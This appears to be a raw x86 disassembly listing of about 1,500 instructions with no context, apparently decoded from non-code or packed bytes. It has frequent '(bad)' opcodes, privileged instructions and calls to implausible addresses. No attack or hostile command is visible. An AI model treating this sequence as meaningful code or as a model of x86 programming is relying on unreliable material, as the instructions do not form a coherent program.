  429431:	test   DWORD PTR [ebp+0xf],esi
  429434:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  42943b:	jne    0x42943f
  42943d:	call   0xffa18f02
  429442:	leave  
  429443:	rcr    BYTE PTR [esp+eax*4],0x55
  429447:	add    ah,ch
  429449:	add    BYTE PTR [edi-0x48fef979],dh
  42944f:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  429456:	inc    esp
  429457:	mov    ebx,DWORD PTR [eax]
  429459:	fcom   st(2)
  42945b:	add    BYTE PTR [edi],bl
  42945d:	lea    ecx,[eax-0x18]
  429460:	(bad)  
  429461:	push   DWORD PTR [ecx]
  429463:	call   0xffb4e1c5
  429468:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  42946c:	fstp   DWORD PTR [esi+ebx*8]
  42946f:	push   ebp
  429470:	pop    ebp
  429471:	mov    esi,DWORD PTR [edx-0x38]
  429474:	add    DWORD PTR [eax],0x28
  429477:	mov    edi,DWORD PTR [ebx]
  429479:	xor    esi,DWORD PTR [edx+0x3]
  42947c:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  429480:	pop    ebp
  429481:	or     al,0x4
  429483:	inc    ecx
  429484:	push   ebp
  429485:	(bad)  
  429486:	in     al,dx
  429487:	or     ah,ch
  429489:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42948a:	xbegin 0xffc80a80
  429490:	clc    
  429491:	adc    al,0x45
  429493:	idiv   BYTE PTR [ecx]
  429495:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  42949c:	test   DWORD PTR [eax+0x665300f8],ebx
  4294a2:	add    BYTE PTR [ecx+0x66],dh
  4294a5:	add    eax,DWORD PTR [ebp+0x52]
  4294a8:	adc    eax,0x20
  4294ab:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  4294b1:	test   DWORD PTR [eax],eax
  4294b3:	clc    
  4294b4:	data16 or al,BYTE PTR [ebp+0x45]
  4294b8:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4294bf:	rol    BYTE PTR [ebp+0x45],1
  4294c2:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4294c8:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4294ce:	push   ebx
  4294cf:	add    BYTE PTR [eax+0x0],dl
  4294d2:	push   ecx
  4294d3:	jge    0x429508
  4294d5:	add    BYTE PTR [esi+0x4],dl
  4294d8:	jne    0x42953f
  4294da:	mov    edx,0x457200
  4294df:	jmp    0x4294a3
  4294e1:	xor    edi,DWORD PTR [ebx]
  4294e3:	pop    edi
  4294e4:	cvtdq2ps xmm7,xmm0
  4294e7:	ret    0x0
  4294ea:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4294f0:	xor    ecx,DWORD PTR [edi]
  4294f2:	add    eax,DWORD PTR [ecx+0x3b]
  4294f5:	push   ebx
  4294f6:	rdpmc  
  4294f8:	out    0x8d,al
  4294fa:	add    BYTE PTR [eax],cl
  4294fc:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  429502:	ret    0x450c
  429505:	sbb    al,0x8b
  429507:	cmp    eax,esi
  429509:	or     cl,al
  42950b:	or     al,0xc2
  42950d:	pop    eax
  42950e:	inc    ebp
  42950f:	add    ecx,DWORD PTR [edi]
  429511:	add    esi,DWORD PTR [ebp+0x39]
  429514:	invd   
  429516:	jge    0x429522
  429518:	mov    eax,0x478ac0
  42951d:	cli    
  42951e:	xor    esp,ecx
  429520:	mov    ebx,0x5b8ac0
  429525:	ret    0x33
  429528:	mov    eax,0x833a8b
  42952d:	sub    BYTE PTR [ebx],al
  42952f:	inc    ebp
  429530:	data16 cmp al,bh
  429533:	pushf  
  429534:	inc    bh
  429536:	mov    esp,esp
  429538:	hlt    
  429539:	test   DWORD PTR [ebp-0x8],esi
  42953c:	mov    eax,DWORD PTR [ebp-0x14]
  42953f:	cmp    cl,BYTE PTR [ebx-0x76478864]
  429545:	dec    edi
  429546:	or     BYTE PTR [eax],al
  429548:	jne    0x4294d3
  42954a:	mov    esi,esp
  42954c:	call   0x77a92111
  429551:	inc    ebp
  429552:	mov    DWORD PTR [eax+0x984f0c],edi
  429558:	add    BYTE PTR [ecx-0x3ffe0717],cl
  42955e:	add    BYTE PTR [esi+0x7d],ah
  429561:	inc    ebp
  429562:	mov    bx,WORD PTR [ebp+0x8]
  429566:	add    DWORD PTR [ebp+0x50],0x30c008b
  42956d:	inc    ebp
  42956e:	mov    bx,di
  429571:	lock test BYTE PTR [ecx+0x7000801],bh
  429578:	jge    0x42953b
  42957a:	mov    ecx,DWORD PTR [ebx-0x670613f0]
  429580:	cli    
  429581:	xor    bl,bh
  429583:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  429589:	test   BYTE PTR [eax],cl
  42958b:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  429592:	cmp    ebp,eax
  429594:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  42959b:	test   BYTE PTR [ebp+0x1],bh
  42959e:	mov    ebx,0x458a00
  4295a3:	xor    esi,DWORD PTR [ebx]
  4295a5:	add    esp,DWORD PTR [esi-0x77]
  4295a8:	pop    ebp
  4295a9:	loopne 0x429611
  4295ab:	inc    ebp
  4295ac:	clc    
  4295ad:	xor    edi,DWORD PTR [ebx]
  4295af:	add    esi,DWORD PTR [edx-0x77]
  4295b2:	data16 fdivr QWORD PTR [ebp-0x49]
  4295b6:	mov    ebx,0xb78afc
  4295bb:	hlt    
  4295bc:	xor    esi,DWORD PTR [esi]
  4295be:	data16 add BYTE PTR [ebp+0x66],bl
  4295c2:	data16 lock clc 
  4295c5:	cmp    eax,DWORD PTR ss:[eax]
  4295c8:	ja     0x429630
  4295ca:	psubq  mm7,QWORD PTR [ebp-0x4]
  4295ce:	ltr    WORD PTR [ebp+0x66]
  4295d2:	add    esi,eax
  4295d4:	add    di,WORD PTR [ebp+0x2b]
  4295d8:	data16 data16 jge 0x429659
  4295dc:	mov    ebx,0xe08a8b
  4295e1:	jge    0x429616
  4295e3:	data16 data16 xor al,0x5d
  4295e7:	data16 data16 jne 0x4295e3
  4295eb:	mov    edi,DWORD PTR [ebx]
  4295ed:	fdiv   QWORD PTR [edx+0x7d]
  4295f0:	data16 data16 jge 0x429628
  4295f4:	mov    ebx,0x758a66
  4295f9:	mov    esi,0x667233
  4295fe:	pop    ebp
  4295ff:	or     BYTE PTR [esi+0x0],ah
  429602:	clc    
  429603:	mov    edi,DWORD PTR [ebx]
  429605:	lock ja 0x429593
  429608:	(bad)  
  42960a:	jge    0x429603
  42960c:	invd   
  42960e:	pop    ebp
  42960f:	add    BYTE PTR [ebx],al
  429611:	(bad)  
  429612:	cmp    di,WORD PTR [ebp+0xf]
  429616:	data16 sbb bh,BYTE PTR [ebp+0x0]
  42961a:	mov    bx,WORD PTR [ebp-0x10]
  42961e:	pop    bp
  429620:	fbstp  TBYTE PTR [ebx]
  429622:	test   DWORD PTR [ebx],eax
  429624:	add    BYTE PTR [ebx],bh
  429626:	add    BYTE PTR [esi+0x7d],ah
  429629:	jge    0x4295b6
  42962b:	data16 in al,dx
  42962d:	pop    ebp
  42962e:	stc    
  42962f:	bsf    ecx,DWORD PTR [ebp+0x66320098]
  429636:	mov    edi,ebx
  429638:	in     al,dx
  429639:	test   BYTE PTR [ebp+0x0],bh
  42963c:	mov    eax,DWORD PTR [eax]
  42963e:	call   0xbd3f8fce
  429643:	ss cwde 
  429645:	add    BYTE PTR [edx],dh
  429647:	mov    bx,di
  42964a:	call   0x8b4b13da
  42964f:	add    ebp,esp
  429651:	mov    bx,di
  429654:	jnp    0x42967c
  429656:	mov    DWORD PTR [ebx+0x367df808],ecx
  42965c:	mov    eax,DWORD PTR [eax]
  42965e:	call   0x7c3e21c9
  429663:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  429669:	data16 data16 fistp WORD PTR [ebp+0xe]
  42966e:	xor    DWORD PTR [edi-0x48fff7b0],0xfb66f403
  429678:	fisttp WORD PTR [ecx-0x7401f77b]
  42967e:	(bad)  
  42967f:	cld    
  429680:	jne    0x4296b8
  429682:	xor    eax,DWORD PTR [eax]
  429684:	mov    esp,DWORD PTR [esi-0x10]
  429687:	sti    
  429688:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  42968f:	data16 adc bl,bh
  429692:	push   ebp
  429693:	xor    ecx,DWORD PTR es:[ebx+0x36e4f88b]
  42969a:	mov    WORD PTR [eax],es
  42969c:	cwde   
  42969d:	data16 xor bh,bl
  4296a0:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4296a6:	mov    esp,DWORD PTR [esi-0x14]
  4296a9:	fisttp WORD PTR [ebx-0x3748a9f2]
  4296af:	or     al,0x2b
  4296b1:	mov    bh,0xba
  4296b3:	hlt    
  4296b4:	mov    bh,bl
  4296b6:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4296bc:	dec    edi
  4296bd:	or     al,0x0
  4296bf:	mov    edi,DWORD PTR [ebx]
  4296c1:	or     BYTE PTR [ebp+0x3b],dh
  4296c4:	mov    ecx,DWORD PTR [edi]
  4296c6:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4296cc:	xor    al,0xd8
  4296ce:	pop    bp
  4296d0:	lock xor esi,DWORD PTR [ebx]
  4296d3:	lea    esp,[esi+0x1f]
  4296d6:	icebp  
  4296d7:	jb     0x4296dd
  4296d9:	add    al,al
  4296db:	jge    0x4296e9
  4296dd:	mov    eax,eax
  4296df:	fsubr  st,st(3)
  4296e1:	pop    ebp
  4296e2:	mov    esi,DWORD PTR [ebx]
  4296e4:	in     al,0x8d
  4296e6:	rcr    DWORD PTR [edi],0xc2
  4296e9:	jb     0x429749
  4296eb:	add    cl,cl
  4296ed:	jge    0x4296fb
  4296ef:	mov    edx,DWORD PTR [ebp-0x20]
  4296f2:	in     al,dx
  4296f3:	pop    ebp
  4296f4:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4296f9:	data16 cmp bh,BYTE PTR [ebp+0x0]
  4296fd:	mov    ebp,DWORD PTR [ebx]
  4296ff:	fdivr  QWORD PTR [esi+0x668a5d]
  429705:	cmp    al,0x33
  429707:	mov    si,0x4f7d
  42970b:	mov    eax,DWORD PTR [eax]
  42970d:	lock inc ebp
  42970f:	mov    esi,DWORD PTR [edi]
  429711:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  429718:	clc    
  429719:	(bad)  
  42971a:	cmp    edi,DWORD PTR [ebx]
  42971c:	je     0x42972d
  42971e:	push   ebx
  42971f:	loopne 0x429730
  429721:	dec    ecx
  429723:	mov    ebp,DWORD PTR [eax-0x1c]
  429726:	int    0xf1
  429728:	mov    esi,0x703084d
  42972d:	orps   xmm6,xmm1
  429730:	add    BYTE PTR [ebp+0x66],dh
  429733:	jmp    0x429700
  429735:	mov    eax,DWORD PTR [ebx]
  429737:	lock push ebp
  429739:	ror    DWORD PTR [ebp-0x2972feb3],1
  42973f:	or     bh,dl
  429741:	jb     0x429741
  429743:	add    BYTE PTR [ebx-0x1a7487b3],cl
  429749:	loopne 0x42974b
  42974b:	jne    0x429749
  42974d:	data16 add BYTE PTR [esi+eiz*2],dh
  429751:	mov    ecx,ebx
  429753:	data16 ss icebp 
  429756:	add    BYTE PTR [esi],dh
  429758:	data16 add bl,cl
  42975b:	data16 xor dh,dl
  42975e:	add    BYTE PTR [edx],dh
  429760:	data16 add bl,cl
  429763:	enterw 0x4df1,0x19
  429768:	pop    edi
  429769:	jne    0x4296ec
  42976b:	mov    esi,DWORD PTR [edi]
  42976d:	call   0x77b7230e
  429772:	xor    ebp,DWORD PTR [ebx]
  429774:	lea    esp,[esi+0x48]
  429777:	repnz in eax,0x3b
  42977a:	add    BYTE PTR [ebp-0x37],dh
  42977d:	xor    edx,DWORD PTR [ebp-0x15]
  429780:	in     al,dx
  429781:	xor    edx,DWORD PTR [esi+0x40]
  429784:	mov    DWORD PTR [edi],0x338545fc
  42978a:	clc    
  42978b:	add    edi,DWORD PTR [eax]
  42978d:	pop    edi
  42978e:	pushf  
  42978f:	pop    ebx
  429790:	call   0xff439757
  429795:	mov    edi,eax
  429797:	push   ecx
  429798:	pop    es
  429799:	mov    edi,DWORD PTR [ebx]
  42979b:	push   esi
  42979c:	inc    ebx
  42979d:	cld    
  42979e:	js     0x4297a0
  4297a0:	popa   
  4297a1:	data16 (bad) 
  4297a3:	into   
  4297a4:	push   0xb900cd36
  4297a9:	data16 or dh,cl
  4297ac:	pop    es
  4297ad:	xor    ah,BYTE PTR [esi+0x0]
  4297b0:	add    bh,al
  4297b2:	cld    
  4297b3:	cld    
  4297b4:	add    BYTE PTR [ebp+0x38c3f866],al
  4297ba:	ss pushf 
  4297bc:	add    BYTE PTR [esi+0x66],ah
  4297bf:	into   
  4297c0:	ret    
  4297c1:	pop    ebp
  4297c2:	add    al,0x57
  4297c4:	add    BYTE PTR [edi-0x723c409a],dh
  4297ca:	add    edi,edi
  4297cc:	jne    0x42981e
  4297ce:	lea    edx,[ecx+0x1]
  4297d1:	mov    ebx,0xd64ff1
  4297d6:	sar    DWORD PTR [ebx],1
  4297d8:	test   BYTE PTR [ebp+0x30],dh
  4297db:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4297df:	push   edi
  4297e0:	xor    BYTE PTR [ebx],0x3b
  4297e3:	mov    esi,ebx
  4297e5:	xor    eax,DWORD PTR [eax-0x3c73879a]
  4297eb:	xor    BYTE PTR [ebp+0x64],al
  4297ee:	pop    ebx
  4297ef:	mov    ebx,0x9c3a37
  4297f4:	je     0x429821
  4297f6:	xor    edi,DWORD PTR [ebx+0x668a33]
  4297fc:	mov    WORD PTR [ebx],?
  4297fe:	xor    BYTE PTR [ebx+0x8b4f64],bh
  429804:	pop    edi
  429805:	cmp    ecx,ecx
  429807:	jne    0x42985e
  429809:	mov    ebp,esp
  42980b:	cld    
  42980c:	push   esi
  42980d:	pop    ebx
  42980e:	inc    ebp
  42980f:	stc    
  429810:	aaa    
  429811:	test   DWORD PTR [eax+edi*8-0x317af642],ebx
  429818:	clc    
  429819:	test   dl,dl
  42981b:	xor    bh,bh
  42981d:	fs pop si
  429820:	or     bl,al
  429822:	cld    
  429823:	mov    eax,DWORD PTR [eax]
  429825:	push   ecx
  429826:	push   di
  429828:	retf   0x3645
  42982b:	aaa    
  42982c:	add    BYTE PTR [esi+eiz*2+0x3285cabe],bl
  429833:	clc    
  429834:	add    BYTE PTR [ebx+0x66],bl
  429837:	dec    edx
  429839:	mov    edx,DWORD PTR [edi-0x76]
  42983c:	push   edi
  42983d:	add    al,0xb7
  42983f:	xor    al,0xba
  429841:	cmp    al,0x8d
  429843:	je     0x429844
  429845:	mov    edx,DWORD PTR [eax-0x46]
  429848:	push   ecx
  429849:	lea    edi,[ebx+0x504fff]
  42984f:	push   ecx
  429850:	cmp    edx,DWORD PTR [ebx+0x75]
  429853:	mov    ecx,DWORD PTR [ecx+0x723afcbb]
  429859:	add    BYTE PTR [ebx],dh
  42985b:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  429861:	add    BYTE PTR [ebx+esi*1+0x4f64bb30],cl
  429868:	mov    ebx,0x3b3a00
  42986d:	jne    0x42989a
  42986f:	mov    DWORD PTR [ebx+0x728afc],edi
  429875:	xor    esi,DWORD PTR [ebx]
  429877:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  42987d:	push   edi
  42987e:	cmp    esp,ebp
  429880:	jne    0x429882
  429882:	sbb    DWORD PTR [eax],0x8085c3fc
  429888:	clc    
  429889:	inc    ebx
  42988a:	pop    ebx
  42988b:	sti    
  42988c:	add    eax,0xeb8bc075
  429891:	cld    
  429892:	xor    edi,DWORD PTR ds:0xf8c3855e
  429898:	mov    ecx,DWORD PTR [ecx+edx*2]
  42989b:	rol    DWORD PTR [ebp-0x37],0xf
  42989f:	mov    DWORD PTR [eax],ecx
  4298a1:	inc    edi
  4298a2:	(bad)  
  4298a3:	in     eax,0x4
  4298a5:	add    bh,bh
  4298a7:	(bad)  
  4298a8:	mov    esi,0xc38a5e
  4298ad:	mov    esi,DWORD PTR [ebx]
  4298af:	push   ecx
  4298b0:	mov    edi,0xfc4fc7
  4298b5:	test   DWORD PTR [ebp-0x8],edx
  4298b8:	data16 cmp bh,al
  4298bb:	pushf  
  4298bc:	sub    ebp,eax
  4298be:	inc    ebp
  4298bf:	(bad)  
  4298c0:	sub    edi,edi
  4298c2:	mov    DWORD PTR [ebx+0x3a03ba08],ecx
  4298c8:	inc    ebp
  4298c9:	add    BYTE PTR [esi+0x2b],ah
  4298cc:	or     bh,BYTE PTR [edx+0xf8ac2]
  4298d2:	cmp    al,0x33
  4298d4:	mov    edi,DWORD PTR [edx+0x44f81]
  4298da:	(bad)  
  4298db:	cmp    esi,DWORD PTR [ebx]
  4298dd:	je     0x429897
  4298df:	push   ebx
  4298e0:	dec    edi
  4298e1:	str    ecx
  4298e4:	cmp    ebp,DWORD PTR [eax+0x75]
  4298e7:	int    0x33
  4298e9:	mov    edi,0x789085f
  4298ee:	mov    eax,DWORD PTR [esp+edi*8]
  4298f1:	add    cl,cl
  4298f3:	data16 add al,0xcb
  4298f6:	push   ebp
  4298f7:	add    ebp,esp
  4298f9:	jne    0x4298e7
  4298fb:	(bad)  
  4298fc:	mov    DWORD PTR [ecx],0xd685f7ec
  429902:	clc    
  429903:	xlat   BYTE PTR ds:[ebx]
  429904:	inc    ebp
  429905:	mov    edi,DWORD PTR [ecx]
  429907:	push   eax
  429908:	pushf  
  429909:	in     eax,0x8b
  42990b:	add    ah,ch
  42990d:	cld    
  42990e:	push   eax
  42990f:	add    BYTE PTR [ecx+0x66],dl
  429912:	add    eax,0x3672cb
  429917:	add    BYTE PTR [ebp+0x66],al
  42991a:	(bad)  
  42991b:	retf   
  42991c:	lock xor al,BYTE PTR [ebp+0x4566f800]
  429923:	retf   
  429924:	cmp    al,0xc8
  429926:	pushf  
  429927:	jge    0x4298f0
  429929:	aaa    
  42992a:	cld    
  42992b:	pushf  
  42992c:	test   DWORD PTR [edi-0x8],ebx
  42992f:	je     0x429976
  429931:	xor    esi,DWORD PTR ds:0x7020840
  429937:	ror    BYTE PTR [ebp-0x37],0x8d
  42993b:	push   ebp
  42993c:	add    esp,ebp
  42993e:	jb     0x4298cb
  429940:	add    BYTE PTR [eax],cl
  429942:	dec    ebp
  429943:	mov    bh,0x81
  429945:	push   esi
  429946:	push   eax
  429947:	adc    DWORD PTR [ecx-0x3b],0x3698ff81
  42994e:	xor    al,BYTE PTR [eax]
  429950:	mov    edx,DWORD PTR [edi+0x10]
  429953:	(bad)  
  429954:	scas   eax,DWORD PTR es:[edi]
  429955:	xor    bh,BYTE PTR [ebx]
  429957:	add    BYTE PTR [edi],cl
  429959:	mov    ebp,ebp
  42995b:	cld    
  42995c:	add    BYTE PTR [ebx],bh
  42995e:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  429962:	dec    ebp
  429963:	or     BYTE PTR [ebx],ch
  429965:	ret    0x458b
  429968:	lock jmp 0x42995c
  42996b:	mov    ecx,DWORD PTR [eax]
  42996d:	or     BYTE PTR [edi],al
  42996f:	mov    ecx,eax
  429971:	xor    DWORD PTR [edx+0x2],0x0
  429975:	mov    bh,0xc1
  429977:	adc    BYTE PTR [eax],dh
  429979:	iret   
  42997a:	inc    ebp
  42997b:	mov    DWORD PTR [ebx],0x4dfff8c5
  429981:	inc    BYTE PTR [ebx]
  429983:	xor    bh,al
  429985:	add    BYTE PTR [ecx],dl
  429987:	data16 adc al,bh
  42998a:	dec    ecx
  42998b:	fisttp WORD PTR [ecx+0x456604c0]
  429991:	add    dh,BYTE PTR ds:0x75e0845
  429997:	ret    0x4d
  42999a:	lea    ecx,[ebx+0x18728301]
  4299a0:	add    BYTE PTR [ebp+0x45],al
  4299a3:	cmp    cl,ch
  4299a5:	pushf  
  4299a6:	add    bh,al
  4299a8:	add    al,ch
  4299aa:	inc    ebp
  4299ab:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4299b1:	xor    eax,0x781084d
  4299b6:	push   eax
  4299b7:	cwde   
  4299b8:	push   ecx
  4299b9:	xor    al,BYTE PTR [ecx+0x32f89889]
  4299bf:	inc    ebp
  4299c0:	cmp    esp,DWORD PTR [eax]
  4299c2:	jbe    0x429960
  4299c4:	mov    eax,edi
  4299c6:	or     ah,dh
  4299c8:	inc    ebp
  4299c9:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4299cf:	cmp    cl,BYTE PTR [ebx-0x74747664]
  4299d5:	in     al,dx
  4299d6:	hlt    
  4299d7:	push   eax
  4299d8:	push   eax
  4299d9:	push   ecx
  4299da:	push   ecx
  4299db:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4299e1:	cwde   
  4299e2:	cwde   
  4299e3:	xor    dh,BYTE PTR [edx]
  4299e5:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4299eb:	or     BYTE PTR [ebp+0x7],al
  4299ee:	mov    eax,ecx
  4299f0:	clc    
  4299f1:	jb     0x4299b4
  4299f3:	add    BYTE PTR [ebp+0x55],cl
  4299f6:	or     DWORD PTR [edi],0xc251d150
  4299fc:	add    DWORD PTR [ebx+0x320098],0x8b76453b
  429a06:	mov    edi,eax
  429a08:	or     cl,al
  429a0a:	inc    ebp
  429a0b:	dec    ebp
  429a0c:	mov    eax,DWORD PTR [ecx+0x514d500c]
  429a12:	or     WORD PTR [ecx],0x8998
  429a17:	xor    cl,BYTE PTR [ebx+0x5076fc3b]
  429a1d:	mov    edx,DWORD PTR [ecx+0x8]
  429a20:	mov    eax,DWORD PTR [ebp-0x8]
  429a23:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb268]
  429a2a:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  429a30:	inc    ebp
  429a31:	dec    eax
  429a32:	add    ecx,DWORD PTR [ebx+0x504df0f8]
  429a38:	add    edx,DWORD PTR [ecx-0x8]
  429a3b:	mov    ecx,DWORD PTR [ecx]
  429a3d:	clc    
  429a3e:	or     BYTE PTR [ebp+eax*2+0x45324098],al
  429a45:	mov    ecx,ebp
  429a47:	clc    
  429a48:	(bad)  
  429a49:	popf   
  429a4a:	inc    DWORD PTR [eax]
  429a4c:	ret    0x8b
  429a4f:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  429a55:	mov    edi,esp
  429a57:	hlt    
  429a58:	test   ecx,esi
  429a5a:	clc    
  429a5b:	or     BYTE PTR [ebp+0x7],al
  429a5e:	cmp    ecx,eax
  429a60:	pushf  
  429a61:	jb     0x429a96
  429a63:	add    BYTE PTR [eax-0x3f],al
  429a66:	inc    eax
  429a67:	daa    
  429a68:	inc    ebp
  429a69:	inc    ebp
  429a6a:	xor    eax,0x7f80803
  429a6f:	dec    ebp
  429a70:	cwde   
  429a71:	add    esi,DWORD PTR [edx]
  429a73:	clc    
  429a74:	cmp    DWORD PTR [ecx],ecx
  429a76:	or     al,0x8
  429a78:	add    al,BYTE PTR [ebp+0x2c]
  429a7b:	xor    eax,0x7350845
  429a80:	or     BYTE PTR [ebp+0x7],cl
  429a83:	lea    ebx,[eax-0x748dcdff]
  429a89:	add    BYTE PTR [eax*2-0x74b21438],cl
  429a90:	mov    edx,DWORD PTR [eax]
  429a92:	cld    
  429a93:	dec    ebp
  429a94:	push   eax
  429a95:	sub    edx,DWORD PTR [ecx-0x75]
  429a98:	add    eax,0xf172fc
  429a9d:	or     BYTE PTR [ebp+0x7],cl
  429aa0:	add    eax,ecx
  429aa2:	or     al,0x72
  429aa4:	add    DWORD PTR [eax],eax
  429aa6:	mov    ebx,0x29c2c1
  429aab:	inc    ebp
  429aac:	mov    eax,DWORD PTR [ebx]
  429aae:	cmp    eax,0x3004d1c
  429ab4:	xbegin 0x66c826ae
  429aba:	clc    
  429abb:	or     BYTE PTR [ebp+0x45],al
  429abe:	cmp    DWORD PTR ds:0x78b089c,esi
  429ac4:	adc    BYTE PTR [ebp+0x45],cl
  429ac7:	lea    eax,[ebp+0x33727501]
  429acd:	add    cl,ch
  429acf:	inc    ebp
  429ad0:	add    bl,ch
  429ad2:	add    BYTE PTR [ebx+0x45850845],cl
  429ad8:	je     0x429a65
  429ada:	push   ebx
  429adb:	or     al,0x85
  429add:	dec    ebp
  429ade:	std    
  429adf:	mov    bh,bh
  429ae1:	mov    BYTE PTR [ebp-0x75],al
  429ae4:	mov    edi,eax
  429ae6:	or     al,0x89
  429ae8:	inc    ebp
  429ae9:	clc    
  429aea:	mov    esp,esp
  429aec:	hlt    
  429aed:	call   DWORD PTR [edi-0x37]
  429af0:	push   eax
  429af1:	or     al,0x51
  429af3:	push   ebp
  429af4:	xor    ebp,esp
  429af6:	mov    esi,0x457251
  429afb:	cmp    dh,al
  429afd:	pushf  
  429afe:	inc    ebp
  429aff:	(bad)  
  429b00:	mov    edi,eax
  429b02:	or     al,0x85
  429b04:	add    al,bh
  429b06:	inc    eax
  429b08:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  429b0c:	or     ah,bh
  429b0e:	inc    eax
  429b0f:	push   eax
  429b10:	jmp    0x429b63
  429b12:	mov    eax,DWORD PTR ds:0xe8720c
  429b18:	mov    DWORD PTR [ebp-0x8],eax
  429b1b:	jne    0x429b62
  429b1d:	jmp    0x429aaa
  429b1f:	mov    ebp,DWORD PTR [eax]
  429b21:	clc    
  429b22:	retf   0xff50
  429b25:	push   ecx
  429b26:	mov    DWORD PTR ds:0x757210,eax
  429b2c:	mov    ecx,DWORD PTR [ebp-0x4]
  429b2f:	sub    esp,DWORD PTR [ebx-0x77]
  429b32:	dec    DWORD PTR [eax*4-0x74ca8abb]
  429b39:	or     ah,bh
  429b3b:	pop    es
  429b3c:	ds cwde 
  429b3e:	push   DWORD PTR [edx]
  429b40:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  429b46:	(bad)  
  429b47:	mov    bh,bh
  429b49:	jmp    0x429b37
  429b4b:	leave  
  429b4c:	jne    0x429b56
  429b4e:	call   0x2f94a8
  429b53:	in     al,dx
  429b54:	dec    ebp
  429b55:	add    dh,BYTE PTR [ebx]
  429b57:	add    BYTE PTR [ebx],al
  429b59:	inc    ebp
  429b5a:	cmp    edi,DWORD PTR [eax]
  429b5c:	je     0x429afa
  429b5e:	mov    eax,edi
  429b60:	or     al,0xf0
  429b62:	add    BYTE PTR [ebp+0x458bf845],al
  429b68:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  429b6e:	adc    al,0x7
  429b70:	enter  0x9fc0,0xa5
  429b74:	rol    BYTE PTR [eax],0x5e
  429b77:	mov    ecx,ecx
  429b79:	or     al,0xc
  429b7b:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  429b82:	jmp    0x429b83
  429b84:	push   ebp
  429b85:	mov    esp,ebp
  429b87:	cld    
  429b88:	inc    ebp
  429b89:	inc    ebp
  429b8a:	or     DWORD PTR [ecx+0x457dec10],0x0
  429b91:	push   esi
  429b92:	push   esi
  429b93:	mov    edi,0x7af080f
  429b98:	add    bh,al
  429b9a:	test   DWORD PTR [eax+0x3a7320f],ebx
  429ba0:	add    BYTE PTR [ecx+0x4540100f],cl
  429ba6:	mov    ebp,eax
  429ba8:	mov    ebp,edi
  429baa:	lock call edx
  429bad:	fcom   DWORD PTR [ebp+0x45]
  429bb0:	mov    eax,0x148a8b
  429bb5:	push   ecx
  429bb6:	enter  0xc145,0x83
  429bba:	cmp    cl,BYTE PTR [eax]
  429bbc:	add    BYTE PTR [ebp+0x4d],al
  429bbf:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  429bc5:	call   0xffa29734
  429bca:	cmp    eax,DWORD PTR [ebp-0xc]
  429bcd:	jmp    DWORD PTR [eax+edx*1-0x4e]
  429bd1:	push   ebp
  429bd2:	(bad)
  429bd5:	std    
  429bd6:	lock push DWORD PTR [edi+0x5d08fcdb]
  429bdd:	inc    ebp
  429bde:	(bad)  
  429bdf:	call   0xff7c986f
  429be4:	add    al,BYTE PTR [ebp+0x37]
  429be7:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  429bed:	jne    0x429bef
  429bef:	(bad)  
  429bf0:	cmp    edi,esp
  429bf2:	jne    0x429c25
  429bf4:	mov    edi,edi
  429bf6:	or     BYTE PTR [ebx-0x307f0b49],cl
  429bfc:	pop    ds
  429bfd:	into   
  429bfe:	je     0x429bc1
  429c00:	mov    ebx,DWORD PTR [esi]
  429c02:	or     BYTE PTR [ebp-0x49],al
  429c05:	mov    esp,DWORD PTR [esi-0x77]
  429c08:	mov    esi,0xfc451f0c
  429c0d:	mov    eax,DWORD PTR [eax]
  429c0f:	or     al,0x66
  429c11:	sar    bl,0x3b
  429c14:	xor    esi,DWORD PTR [ebp+0x66]
  429c17:	xor    ecx,edi
  429c19:	pop    edi
  429c1a:	adc    bl,BYTE PTR [ebx+0x78]
  429c1d:	ret    0xff
  429c20:	cld    
  429c21:	inc    ebp
  429c22:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  429c28:	cld    
  429c29:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  429c30:	push   0xffffff83
  429c32:	pop    edi
  429c33:	or     BYTE PTR [ebp+0x53],dh
  429c36:	xorps  xmm1,xmm2
  429c39:	test   BYTE PTR [eax+eax*1],bh
  429c3c:	add    BYTE PTR [eax],al
  429c3e:	adc    eax,eax
  429c40:	add    DWORD PTR [eax+edi*2-0xff7b00],0xffffffb7
  429c48:	jmp    DWORD PTR [eax]
  429c4a:	ror    al,0x5e
  429c4d:	inc    ebp
  429c4e:	leave  
  429c4f:	xor    ecx,DWORD PTR [eax]
  429c51:	and    DWORD PTR [ebx-0x3ec90708],ecx
  429c57:	add    ch,al
  429c59:	xor    edi,edi
